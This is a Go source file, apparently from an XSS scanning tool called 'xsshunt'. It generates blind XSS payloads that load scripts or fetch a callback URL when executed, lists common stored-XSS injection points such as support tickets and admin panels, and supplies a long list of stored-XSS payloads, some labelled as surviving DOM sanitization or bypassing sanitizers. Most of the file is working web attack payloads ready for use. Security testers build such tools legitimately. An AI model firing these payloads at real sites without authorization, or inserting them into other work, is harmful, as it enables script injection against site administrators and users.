package scanner

import (
	"fmt"
	"net/url"
	"strings"
	"time"

	"github.com/fatih/color"
)

// BlindXSSConfig holds configuration for blind XSS testing
type BlindXSSConfig struct {
	CallbackURL   string   // Unique callback URL for blind XSS detection
	Payloads      []string // Custom blind XSS payloads
	StoredScan    bool     // Whether to scan for stored XSS
	InjectionTags []string // Tags to test (script, img, etc.)
}

// BlindXSSPayloadGenerator generates payloads for blind XSS testing
type BlindXSSPayloadGenerator struct {
	callbackURL string
	identifier  string
}

// NewBlindXSSPayloadGenerator creates a new blind XSS payload generator
func NewBlindXSSPayloadGenerator(callbackURL string) *BlindXSSPayloadGenerator {
	return &BlindXSSPayloadGenerator{
		callbackURL: callbackURL,
		identifier:  fmt.Sprintf("xsshunt_%d", time.Now().UnixNano()),
	}
}

// GetBlindXSSPayloads generates blind XSS payloads
// These payloads will call back to the specified URL when executed
func (g *BlindXSSPayloadGenerator) GetBlindXSSPayloads() []string {
	if g.callbackURL == "" {
		return nil
	}

	// Ensure callback URL has proper scheme
	cbURL := g.callbackURL
	if !strings.HasPrefix(cbURL, "http://") && !strings.HasPrefix(cbURL, "https://") {
		cbURL = "https://" + cbURL
	}

	// Add identifier to callback URL
	parsedURL, err := url.Parse(cbURL)
	if err != nil {
		return nil
	}

	q := parsedURL.Query()
	q.Set("id", g.identifier)
	parsedURL.RawQuery = q.Encode()
	callbackWithID := parsedURL.String()

	// Generate various blind XSS payloads
	payloads := []string{
		// Classic script tag with external source
		fmt.Sprintf(`"><script src="%s"></script>`, callbackWithID),
		fmt.Sprintf(`'><script src="%s"></script>`, callbackWithID),
		fmt.Sprintf(`<script src="%s"></script>`, callbackWithID),

		// Image tag with onerror
		fmt.Sprintf(`"><img src=x onerror="javascript:new Image().src='%s'">`, callbackWithID),
		fmt.Sprintf(`<img src=x onerror="this.src='%s'">`, callbackWithID),

		// SVG with onload
		fmt.Sprintf(`"><svg onload="fetch('%s')">`, callbackWithID),
		fmt.Sprintf(`<svg onload="new Image().src='%s'">`, callbackWithID),

		// XHR/Fetch based
		fmt.Sprintf(`"><script>fetch('%s')</script>`, callbackWithID),
		fmt.Sprintf(`<script>var x=new XMLHttpRequest();x.open('GET','%s');x.send()</script>`, callbackWithID),

		// Event handler payloads
		fmt.Sprintf(`" onfocus="fetch('%s')" autofocus="`, callbackWithID),
		fmt.Sprintf(`" onmouseover="new Image().src='%s'" x="`, callbackWithID),

		// JavaScript URL
		fmt.Sprintf(`javascript:fetch('%s')`, callbackWithID),
		fmt.Sprintf(`javascript:new Image().src='%s'`, callbackWithID),

		// Body tag payloads for stored XSS
		fmt.Sprintf(`<body onload="fetch('%s')">`, callbackWithID),
		fmt.Sprintf(`<body onpageshow="fetch('%s')">`, callbackWithID),

		// Input field payloads
		fmt.Sprintf(`<input onfocus="fetch('%s')" autofocus>`, callbackWithID),
		fmt.Sprintf(`<input onblur="fetch('%s')" autofocus>`, callbackWithID),

		// Iframe payloads
		fmt.Sprintf(`<iframe src="%s"></iframe>`, callbackWithID),
		fmt.Sprintf(`<iframe srcdoc="<script>parent.postMessage('xss','*');fetch('%s')</script>">`, callbackWithID),

		// Object tag
		fmt.Sprintf(`<object data="%s">`, callbackWithID),

		// Embed tag
		fmt.Sprintf(`<embed src="%s">`, callbackWithID),

		// Link tag with stylesheet (less common but useful)
		fmt.Sprintf(`<link rel="stylesheet" href="%s">`, callbackWithID),

		// Audio/Video tags
		fmt.Sprintf(`<audio src=x onerror="fetch('%s')">`, callbackWithID),
		fmt.Sprintf(`<video src=x onerror="fetch('%s')">`, callbackWithID),

		// Details/Summary with auto-trigger
		fmt.Sprintf(`<details open ontoggle="fetch('%s')"><summary>X</summary></details>`, callbackWithID),

		// Marquee (old but sometimes works)
		fmt.Sprintf(`<marquee onstart="fetch('%s')">`, callbackWithID),

		// Polyglot blind XSS payloads
		fmt.Sprintf(`"'><script src="%s"></script><input value="`, callbackWithID),
		fmt.Sprintf(`</script><script src="%s">`, callbackWithID),
	}

	return payloads
}

// GetIdentifier returns the unique identifier for this scan
func (g *BlindXSSPayloadGenerator) GetIdentifier() string {
	return g.identifier
}

// PrintBlindXSSInstructions prints instructions for setting up blind XSS detection
func PrintBlindXSSInstructions() {
	color.Yellow("\n┌─────────────────────────────────────────────────────────────┐")
	color.Yellow("│              BLIND XSS DETECTION SETUP                      │")
	color.Yellow("└─────────────────────────────────────────────────────────────┘")
	color.White(`
  Blind XSS payloads require a callback server to detect execution.
  
  Options:
  1. Use XSSHunter (https://xsshunter.com)
  2. Use Burp Collaborator
  3. Use your own callback server
  
  Usage:
    xsshunt "https://target.com/contact" --blind-callback "https://yourserver.com/callback"
    xsshunt "https://target.com/form" --blind-callback "yourid.xsshunter.com"
  
  Note: Blind XSS may take time to trigger (hours, days, or even weeks)
  depending on when an admin views the injected content.
`)
	color.Yellow("───────────────────────────────────────────────────────────────")
}

// StoredXSSLocations returns common injection points for stored XSS
func StoredXSSLocations() []string {
	return []string{
		"User profile fields (name, bio, website)",
		"Comment sections",
		"Contact forms",
		"Support tickets",
		"File upload names",
		"Email subject/body in webmail",
		"Product reviews",
		"Forum posts",
		"Chat messages",
		"Webhook configurations",
		"API error messages",
		"Log viewers",
		"Admin panels",
		"Report generation",
	}
}

// GetStoredXSSPayloads returns payloads optimized for stored XSS
func GetStoredXSSPayloads() []string {
	return []string{
		// Minimal payloads that fit in small fields
		`<script>alert(1)</script>`,
		`<img src=x onerror=alert(1)>`,
		`<svg onload=alert(1)>`,

		// Payloads that work in various contexts
		`"><img src=x onerror=alert(1)>`,
		`'><img src=x onerror=alert(1)>`,
		`</title><script>alert(1)</script>`,
		`</textarea><script>alert(1)</script>`,

		// Time-delayed payloads
		`<script>setTimeout(function(){alert(1)},1000)</script>`,

		// Mutation-based payloads (survive DOM sanitization)
		`<noscript><p title="</noscript><script>alert(1)</script>">`,
		`<math><mtext><table><mglyph><style><![CDATA[</style><img src=x onerror=alert(1)>]]>`,

		// Payloads that might bypass sanitizers
		`<a href="javascript:alert(1)">click</a>`,
		`<form action="javascript:alert(1)"><input type=submit>`,

		// Payloads for rich text editors
		`<p onclick="alert(1)">click me</p>`,
		`<div onmouseover="alert(1)">hover me</div>`,

		// HTML5 specific payloads
		`<details open ontoggle=alert(1)><summary>X</summary></details>`,
		`<video><source onerror=alert(1)>`,

		// Attribute injection for stored contexts
		`" onclick="alert(1)" x="`,
		`' onclick='alert(1)' x='`,

		// Payloads using data URIs
		`<object data="data:text/html,<script>alert(1)</script>">`,
		`<iframe src="data:text/html,<script>alert(1)</script>">`,
	}
}
